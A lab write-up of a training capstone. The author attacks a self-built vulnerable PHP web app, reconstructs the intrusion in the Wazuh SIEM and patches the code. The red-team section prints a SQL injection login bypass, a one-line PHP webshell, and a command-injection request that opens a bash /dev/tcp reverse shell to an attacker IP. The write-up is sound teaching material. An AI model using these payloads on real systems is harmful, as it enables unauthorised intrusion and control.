---
title: "Full-Cycle Web Exploitation & Incident Response: Masar Final Project"
categories: Lab
tags: pentesting web-security
toc: true
mermaid: ture
---

For my final project in the National Cyber Security Center (NCSC) Masar training program, I designed an engagement to demonstrate a complete security lifecycle: from infrastructure build and adversary emulation to SIEM threat hunting and source code remediation.

This writeup details the compromise of "TechNest," a custom vulnerable web application I built for this lab. By merging the offensive tactics I practice in CTFs with the telemetry analysis used in SOC operations, the objective was to achieve Remote Code Execution (RCE), reconstruct the attack timeline using Wazuh, and patch the vulnerable code.

## 1. Environment & Infrastructure Setup

To properly separate attack traffic, target services, and monitoring telemetry, the lab was segmented into three Debian and Kali Linux virtual machines.

| VM | Role | OS & Key Services |
| --- | --- | --- |
| **VM1 (Target)** | Vulnerable Web Server | Debian 13.x, Apache, PHP, MariaDB, Wazuh Agent, rsyslog |
| **VM2 (SIEM)** | Wazuh Manager | Debian 13.x, Wazuh Dashboard, Indexer, Filebeat |
| **VM3 (Attacker)** | Adversary Workstation | Kali Linux, Burp Suite, Nmap, Gobuster, Netcat |

![](/assets/images/lab/masar-final-project/pasted-data-imageacaacb_ryNe.png)

To ensure complete visibility for the incident response phase, VM1 was configured as a Wazuh agent (`vm1-technest`). It forwarded all Apache access logs, Apache error logs, and raw bash command history (via `rsyslog` and `logger`) directly to the Wazuh manager on VM2.

![](/assets/images/lab/masar-final-project/pasted-data-image23ea24_ryNe.png)

## 2. Exploitation (Red Team Phase)

Network and directory enumeration using `nmap` and `gobuster` revealed an Apache web server hosting the TechNest application over HTTPS. Manual mapping exposed several critical endpoints, which I systematically exploited to build an attack chain.

### SQL Injection: Fingerprinting to Authentication Bypass

Testing the `POST /login.php` input fields revealed classic SQL injection vulnerabilities. Submitting a backslash (`\`) or a single quote (`'`) triggered an HTTP 500 Internal Server Error, indicating that the escape characters were breaking the expected SQL syntax. Conversely, submitting a double quote (`"`) returned a 200 OK. This confirmed the application was concatenating user input directly into a single-quoted SQL string without safe parameter binding.

By injecting `' -- -`, I successfully escaped the SQL statement, commented out the password verification logic, and bypassed the authentication portal entirely, granting me access as the `admin` user.

```
POST /login.php HTTP/1.1
Host: 10.10.10.6

username=admin' -- -&password=
```

![](/assets/images/lab/masar-final-project/pasted-data-image7d3f99_ryNe.png)![](/assets/images/lab/masar-final-project/pasted-data-imagec694da_ryNe.png)

### Stored XSS & The Mixed-Content Roadblock

The `/product.php` review section suffered from a Stored Cross-Site Scripting (XSS) vulnerability. A basic `<script>alert(1)</script>` payload executed perfectly upon page reload.

Weaponizing this to steal session cookies, however, introduced realistic environmental constraints. My initial `fetch()` payload was blocked by the browser because HTTP exfiltration attempts from an HTTPS application context trigger mixed-content protections.

![](/assets/images/lab/masar-final-project/pasted-data-imageaa01d5_ryNe.png)

I attempted to bypass this by setting up a self-signed HTTPS listener on my Kali machine and using an `<img>` tag error handler (`onerror`) to exfiltrate the `document.cookie`. The browser rejected the self-signed TLS certificate, failing the handshake. While strict transport security prevented the exfiltration, the core vulnerability remained validated as the script successfully executed within the victim's browser context.

### Unrestricted File Upload to OS Command Injection

The `/account.php` profile page permitted avatar uploads but failed to validate file extensions or MIME types. I successfully uploaded a PHP webshell (`shell.php`) into the web-accessible `/uploads/` directory:

```
<?php system($_GET["cmd"]); ?>
```

![](/assets/images/lab/masar-final-project/pasted-data-image1b894f_ryNe.png)

While I could execute basic commands like `id` and `ip a` via the `cmd` query parameter, attempting to spawn a reverse shell through this webshell failed due to PHP `system()` argument handling and URL encoding issues.

To establish a stable foothold, I pivoted to the `/diagnostics.php` endpoint, which passed user input directly to a system `ping` command. Injecting a shell separator (`;`) alongside a bash file-descriptor payload (as standard bash redirection failed in this context) yielded a successful interactive reverse shell.

```
POST /diagnostics.php HTTP/1.1
Host: 10.10.10.6

order_id=127.0.0.1 ; bash -c 'bash -i 5<> /dev/tcp/192.168.230.130/4444 0<&5 1>&5 2>&5'
```

![](/assets/images/lab/masar-final-project/pasted-data-image926c59_ryNe.png)

My Netcat listener caught the connection, securing an interactive shell as `www-data`.

![](/assets/images/lab/masar-final-project/pasted-data-imageac661d_ryNe.png)

## 3. Detection & Investigation (Blue Team Phase)

With the compromise complete, I transitioned to the Wazuh Discover dashboard to reconstruct the attack timeline. Because VM1 was forwarding raw Apache logs and bash history to the `wazuh-archives-4.x-*` index, I could track the adversary's exact movements.

**Isolating the Attack Vector:**
I queried the archives for the specific endpoints abused during the attack. The logs clearly showed the anomalous `POST` requests to the vulnerable routes, alongside the execution of the uploaded webshell.

```
agent.name: "vm1-technest" and full_log: "shell.php"
agent.name: "vm1-technest" and location: "/var/log/apache2/vulnapp_access.log" and full_log: "POST /diagnostics.php"
```

![](/assets/images/lab/masar-final-project/pasted-data-imageae6df5_ryNe.png)

I was also able to isolate the initial SQL injection payloads targeting the login endpoint, mapping the very beginning of the attack chain.

![](/assets/images/lab/masar-final-project/pasted-data-image95f285_ryNe.png)

**Tracing Post-Exploitation Activity:**
To confirm what the attacker did after obtaining the reverse shell, I queried the forwarded `rsyslog` bash command history. This revealed the exact commands (`id`, `hostname`, `ip a`) executed by the `www-data` user, providing a definitive timeline of post-compromise activity.

```
agent.name: "vm1-technest" and location: "/var/log/bash_commands.log"
```

![](/assets/images/lab/masar-final-project/pasted-data-image00d01a_ryNe.png)

## 4. Containment & Code Remediation (Purple Team Phase)

**Containment:**
Using legitimate SSH access, I verified the attacker artifacts on the file system and permanently deleted `/var/www/html/app/uploads/shell.php`. I then ran extensive checks across cron jobs, `/etc/systemd/system`, and `.ssh` directories to verify no persistence mechanisms were established.

![](/assets/images/lab/masar-final-project/pasted-data-image3cafad_ryNe.png)

**Code Patching:**
To prevent re-exploitation, I rewrote the vulnerable components in the PHP application and committed the fixes to Git:

- **Command Injection (`diagnostics.php`):** Replaced the vulnerable `shell_exec()` function with the secure `proc_open()` API. I added strict input validation to explicitly reject shell metacharacters, spaces, and redirection payloads.
- **File Upload (`account.php`):** Hardened the endpoint by utilizing `finfo_file` to strictly enforce JPEG, PNG, and GIF MIME types, and enforced server-side randomization for all uploaded filenames. The Apache configuration was also updated to explicitly deny script execution within the uploads directory (`Options -ExecCGI` and `Require all denied` for PHP extensions).
- **Stored XSS (`product.php`):** Enforced sanitization on all user-generated review output using `htmlspecialchars(..., ENT_QUOTES, 'UTF-8')` prior to rendering.
- **SQL Injection (`login.php`):** Replaced string-concatenated SQL queries with secure prepared statements, properly binding the `username` and `password` parameters.

![](/assets/images/lab/masar-final-project/pasted-data-imageceaf9c_ryNe.png)

Following the code deployment, I executed a full re-test of the original exploit chain. The patched application successfully blocked all attacks—returning generic login errors for SQLi attempts, sanitizing script tags into raw text, and rejecting PHP file uploads.

Most importantly, querying the Wazuh archives with a unique re-test user-agent token (`codex-retest-20260507-200709`) confirmed that the SIEM continued to log the blocked exploitation attempts, proving that our detection coverage remained highly effective even after the vulnerabilities were remediated.

Thank you for reading!
